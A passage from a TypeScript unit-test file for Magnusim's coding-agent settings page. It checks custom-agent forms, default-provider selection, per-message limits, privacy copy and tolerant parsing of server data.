    expect(q('[data-assistant-agents-notice]')).toHaveTextContent('My agent was added. It stays off until you allow it.');
  });

  it('at most 8 variables; Cancel closes the form and puts focus back on its button', async () => {
    await renderAgents();
    fireEvent.click(q('[data-assistant-agent-add-open]')!);
    const add = within(q('[data-assistant-agent-custom-form]')!).getByRole('button', { name: 'Add a variable' });
    for (let i = 0; i < KEEP_ENV_MAX + 2; i++) fireEvent.click(add);
    expect(q('[data-assistant-agent-custom-form]')!.querySelectorAll('[data-assistant-agent-custom-var]')).toHaveLength(KEEP_ENV_MAX);
    expect(add).toHaveAttribute('aria-disabled', 'true');
    fireEvent.click(within(q('[data-assistant-agent-custom-form]')!).getByRole('button', { name: 'Cancel' }));
    expect(q('[data-assistant-agent-custom-form]')).toBeNull();
    expect(document.activeElement).toBe(q('[data-assistant-agent-add-open]'));
  });

  it("a refused command says why under it (the field invalid and focused); an empty name isn't sent", async () => {
    customAnswer = { status: 400, body: { ok: false, code: 'cant_start_script', error: "Magnusim starts agents without a command shell, so it can't start run.bat.", field: 'command' } };
    await renderAgents();
    fireEvent.click(q('[data-assistant-agent-add-open]')!);
    const form = q('[data-assistant-agent-custom-form]')!;
    fireEvent.click(within(form).getByRole('button', { name: 'Add' }));
    expect(q('[data-assistant-agent-custom-error="name"]')).toHaveTextContent('Give the agent a name.');
    expect(posts('/api/assistant/agents/custom')).toEqual([]);
    fireEvent.change(within(form).getByLabelText('Name'), { target: { value: 'Batch' } });
    fireEvent.change(within(form).getByLabelText('Command'), { target: { value: 'run.bat' } });
    fireEvent.click(within(form).getByRole('button', { name: 'Add' }));
    await waitFor(() => expect(q('[data-assistant-agent-custom-error="command"]')).toHaveTextContent("can't start run.bat"));
    const command = within(form).getByLabelText('Command');
    expect(command).toHaveAttribute('aria-invalid', 'true');
    expect(document.activeElement).toBe(command);
    expect(q('[data-assistant-agent-custom-error="command"]')).toHaveAttribute('role', 'alert');
  });

  it('Remove asks first (safe); yes removes it and the focus goes to Add a custom agent…; no keeps it', async () => {
    rows = [row(), codex({ id: 'custom-0f0f0f', name: 'Mine', kind: 'custom' })];
    await renderAgents();
    expect(q('[data-assistant-agent-remove="claude"]')).toBeNull();
    const remove = q<HTMLButtonElement>('[data-assistant-agent-remove="custom-0f0f0f"]')!;
    remove.focus();
    fireEvent.click(remove);
    await waitFor(() => expect(confirmAction).toHaveBeenCalledTimes(1));
    expect(confirmAction.mock.calls[0][0]).toMatchObject({ title: 'Remove Mine?', yes: 'Remove', safe: true });
    await waitFor(() => expect(document.activeElement).toBe(remove));
    expect(posts('/api/assistant/agents/custom/remove')).toEqual([]);
    confirmAction.mockResolvedValue(true);
    fireEvent.click(remove);
    await waitFor(() => expect(q('[data-assistant-agent="custom-0f0f0f"]')).toBeNull());
    expect(posts('/api/assistant/agents/custom/remove')).toEqual([{ id: 'custom-0f0f0f' }]);
    expect(document.activeElement).toBe(q('[data-assistant-agent-add-open]'));
    expect(q('[data-assistant-agents-notice]')).toHaveTextContent('Mine was removed.');
  });
});

describe('Coding agents in the Default choice and the limits', () => {
  const ready = (extra: Record<string, unknown> = {}) => ({
    providers_ready: {
      anthropic: { label: 'Anthropic', kind: 'key', ready: true, reason: null, billing: 'usd', detail: 'Key set, ends in …a1b2' },
      'agent:claude': { label: 'Claude Code', kind: 'agent', ready: true, reason: null, billing: 'agent_account', detail: 'Signed in · 0.85.1' },
      'agent:codex': { label: 'Codex', kind: 'agent', ready: false, reason: 'agent_not_allowed', billing: 'agent_account', detail: 'Off until you allow it' },
    },
    ...extra,
  });

  it('the Default radiogroup lists each agent found, as "<Name> (coding agent)", with its line, ready dot and billing line, after every API-key provider', async () => {
    await renderAgents(ready());
    const group = screen.getByRole('radiogroup', { name: 'Default provider' });
    const options = [...group.querySelectorAll('[data-assistant-default-option]')].map((el) => el.getAttribute('data-assistant-default-option'));
    expect(options).toEqual(['off', 'openai_compatible', 'anthropic', 'openai', 'agent:claude', 'agent:codex']);
    const claude = q('[data-assistant-default-option="agent:claude"]')!;
    expect(within(claude as HTMLElement).getByRole('radio', { name: /Claude Code \(coding agent\)/ })).toBeInTheDocument();
    expect(claude.querySelector('[data-assistant-default-state]')).toHaveTextContent('Signed in · 0.85.1');
    expect(claude.querySelector('[data-assistant-dot]')).toHaveAttribute('data-assistant-dot', 'ready');
    expect(claude.querySelector('[data-assistant-default-billing]')!.textContent).toBe(defaultBillingText('Claude Code'));
    expect(defaultBillingText('Claude Code')).toBe("Billed to your Claude Code account; Magnusim's $ limits don't apply to it.");
    expect(q('[data-assistant-default-option="agent:codex"] [data-assistant-dot]')).toHaveAttribute('data-assistant-dot', 'not-ready');
    // The API-key options carry no billing line.
    expect(q('[data-assistant-default-option="anthropic"] [data-assistant-default-billing]')).toBeNull();
  });

  it('choosing an agent saves it as the default (every card stays); a refusal shows and the saved default stays', async () => {
    await renderAgents(ready());
    fireEvent.click(q('[data-assistant-default-option="agent:claude"] input')!);
    await waitFor(() => expect(q('[data-assistant-default]')).toHaveAttribute('data-assistant-default', 'agent:claude'));
    expect(posts('/api/assistant/settings')).toEqual([{ provider: 'agent:claude' }]);
    expect(document.querySelectorAll('[data-assistant-card]')).toHaveLength(3);
    expect(agent('claude').querySelector('[data-assistant-agent-default]')).toHaveTextContent('Default');
    settingsAnswer = { status: 400, body: { ok: false, error: 'Unknown provider.', field: 'provider' } };
    fireEvent.click(q('[data-assistant-default-option="agent:codex"] input')!);
    await waitFor(() => expect(q('[data-assistant-default-error]')).toHaveTextContent('Unknown provider.'));
    expect(q('[data-assistant-default]')).toHaveAttribute('data-assistant-default', 'agent:claude');
    expect(q<HTMLInputElement>('[data-assistant-default-option="agent:claude"] input')!.checked).toBe(true);
  });

  it("a saved default agent that is no longer found is still shown, chosen, under its name with why it can't run (its row, as the server sends it)", async () => {
    await renderAgents({ provider: 'agent:gemini' });
    expect(q<HTMLInputElement>('[data-assistant-default-option="agent:gemini"] input')!.checked).toBe(true);
    cleanup();
    resetStatusStore();
    const missingRow = { label: 'Gemini CLI', kind: 'agent', ready: false, reason: 'agent_missing', billing: 'agent_account', detail: 'Not installed' };
    await renderAgents({ provider: 'agent:gemini', ready: false, ready_reason: 'agent_missing', ...ready({}), providers_ready: { ...ready().providers_ready, 'agent:gemini': missingRow } });
    const gemini = q('[data-assistant-default-option="agent:gemini"]')!;
    expect(within(gemini as HTMLElement).getByRole('radio', { name: /^Gemini CLI \(coding agent\)/ })).toBeChecked();
    expect(gemini.querySelector('[data-assistant-default-state]')).toHaveTextContent('Not installed');
    expect(gemini.querySelector('[data-assistant-dot]')).toHaveAttribute('data-assistant-dot', 'not-ready');
    expect(gemini.querySelector('[data-assistant-default-billing]')!.textContent).toBe(defaultBillingText('Gemini CLI'));
  });

  it("the limits: API keys' (with Spent today (API keys)) and coding agents' (changes, tool calls, minutes per message), each saved at once", async () => {
    await renderAgents({ spent_today_usd: 0.42 });
    expect(q('[data-assistant-spent]')!.textContent).toBe('Spent today (API keys): $0.42 of $15.00');
    const group = screen.getByRole('group', { name: 'Coding agents limits' });
    expect(within(group).getByLabelText('Changes per message')).toHaveValue(24);
    expect(within(group).getByLabelText('Tool calls per message')).toHaveValue(400);
    expect(within(group).getByLabelText('Minutes per message')).toHaveValue(60);
    expect(q('[data-assistant-agent-limits-copy]')!.textContent).toBe(AGENT_LIMITS_TEXT);
    const changes = within(group).getByLabelText('Changes per message');
    changes.focus();
    fireEvent.change(changes, { target: { value: '30' } });
    fireEvent.keyDown(changes, { key: 'Enter' });
    await waitFor(() => expect(posts('/api/assistant/settings')).toEqual([{ agent_caps: { changes: 30 } }]));
    await waitFor(() => expect(within(screen.getByRole('group', { name: 'Coding agents limits' })).getByLabelText('Changes per message')).toHaveValue(30));
    // The API-key limits are their own group, and keep their four fields.
    expect(screen.getByRole('group', { name: 'API keys limits' }).querySelectorAll('.wiz-assistant-cap input')).toHaveLength(4);
  });

  it("a refused agent limit says why under its field; a server without agent limits shows none", async () => {
    settingsAnswer = { status: 400, body: { ok: false, error: 'This limit must be a whole number from 10 to 2,000.', field: 'agent_caps.calls' } };
    await renderAgents();
    const calls = within(screen.getByRole('group', { name: 'Coding agents limits' })).getByLabelText('Tool calls per message');
    fireEvent.change(calls, { target: { value: '5' } });
    fireEvent.blur(calls);
    await waitFor(() => expect(q('[data-assistant-cap-error="agent_calls"]')).toHaveTextContent('This limit must be a whole number from 10 to 2,000.'));
    expect(calls).toHaveAttribute('aria-invalid', 'true');
    cleanup();
    resetStatusStore();
    const s = baseStatus();
    delete s.agent_caps;
    status = s;
    render(<AssistantStep panelId="wiz-assistant" />);
    await waitFor(() => expect(q('[data-assistant-limits]')).toBeTruthy());
    expect(q('[data-assistant-agent-limits]')).toBeNull();
  });

  it('the privacy copy names coding agents and other apps (MCP)', async () => {
    await renderAgents();
    expect(q('[data-assistant-privacy-copy]')!.textContent).toBe(PRIVACY_COPY);
    expect(PRIVACY_COPY).toContain('coding agents, other apps (MCP)');
    expect(PRIVACY_COPY).toContain('send project data off this PC');
  });
});

describe('the page reads what the server sends tolerantly', () => {
  it('readAgentRow: a row without id or name is dropped; odd fields are read as unknown; own tools are off only when the server says so', () => {
    expect(readAgentRow({ name: 'x' })).toBeNull();
    expect(readAgentRow({ id: 'x' })).toBeNull();
    const r = readAgentRow({ id: 'x', name: 'X', signed_in: 'maybe', own_tools: 'sometimes', lockdown: 7, needs_allow: 'yes' }) as AgentRow;
    expect(r).toMatchObject({ signed_in: 'unknown', own_tools: 'on', lockdown: 'none', needs_allow: true, found: false, last: null, sign_in: null });
  });

  it('readSignInMethods: {methods} or a bare list; the terminal line as a string or {line}; variables', () => {
    const list = [
      { id: 't1', name: 'T1', type: 'terminal', command: 'a b' },
      { id: 't2', name: 'T2', type: 'terminal', command: { line: 'c d' } },
      { id: 't3', type: 'terminal', line: 'e f' },
      { id: 't4', type: 'terminal', command: null },
      { id: 'v', type: 'env_var', vars: ['A_KEY'], var: 'B_KEY' },
      { name: 'no id' },
    ];
    const m = readSignInMethods({ methods: list });
    expect(m.map((x) => [x.id, x.type, x.command, x.vars])).toEqual([
      ['t1', 'terminal', 'a b', []],
      ['t2', 'terminal', 'c d', []],
      ['t3', 'terminal', 'e f', []],
      ['t4', 'terminal', null, []],
      ['v', 'env_var', null, ['A_KEY', 'B_KEY']],
    ]);
    expect(readSignInMethods(list)).toHaveLength(5);
    expect(readSignInMethods('nonsense')).toEqual([]);
  });

  it('readAgentTest: an answer without ok is a failure with a plain text', () => {
    expect(readAgentTest({})).toEqual({ ok: false, code: 'failed', error: 'The check failed.' });
    expect(readAgentTest({ ok: true, ms: 'x', tools: 'maybe' })).toMatchObject({ ok: true, ms: 0, tools: null, own_tools: 'on', auth_status: null });
    // The agent's own word on its login, apart from the login file's signed_in.
    expect(readAgentTest({ ok: true, signed_in: 'yes', auth_status: 'none' })).toMatchObject({ signed_in: 'yes', auth_status: 'none' });
    expect(readAgentTest({ ok: true, auth_status: 'signed_in' })).toMatchObject({ auth_status: 'signed_in' });
    expect(readAgentTest({ ok: true, auth_status: 'account' })).toMatchObject({ auth_status: null });
  });

  it('the status helpers: agent providers, the Default choices, the agent limits', () => {
    expect(isAgentProvider('agent:claude')).toBe(true);
    expect(isAgentProvider('agent:custom-a1b2c3')).toBe(true);
    expect(isAgentProvider('agent:')).toBe(false);
    expect(isAgentProvider('anthropic')).toBe(false);
    const s = baseStatus({
      provider: 'agent:gone',
      providers_ready: {
        anthropic: { label: 'Anthropic', kind: 'key', ready: true, reason: null, billing: 'usd', detail: '' },
        'agent:claude': { label: 'Claude Code', kind: 'agent', ready: true, reason: null, billing: 'agent_account', detail: 'Signed in' },
        'agent:BAD': { label: 'Bad', kind: 'agent', ready: true, reason: null, billing: 'agent_account', detail: '' },
      },
    }) as unknown as AssistantStatus;
    expect(agentChoices(s)).toEqual([
      { id: 'agent:claude', name: 'Claude Code', ready: true, detail: 'Signed in' },
      { id: 'agent:gone', name: 'gone', ready: false, detail: '' },
    ]);
    expect(agentCapsOf(s)).toEqual({ changes: 24, calls: 400, turn_minutes: 60 });
    expect(agentCapsOf({ ...s, agent_caps: { changes: 1 } } as unknown as AssistantStatus)).toBeNull();
    expect(agentCapsOf({ ...s, agent_caps: undefined } as unknown as AssistantStatus)).toBeNull();
  });
});
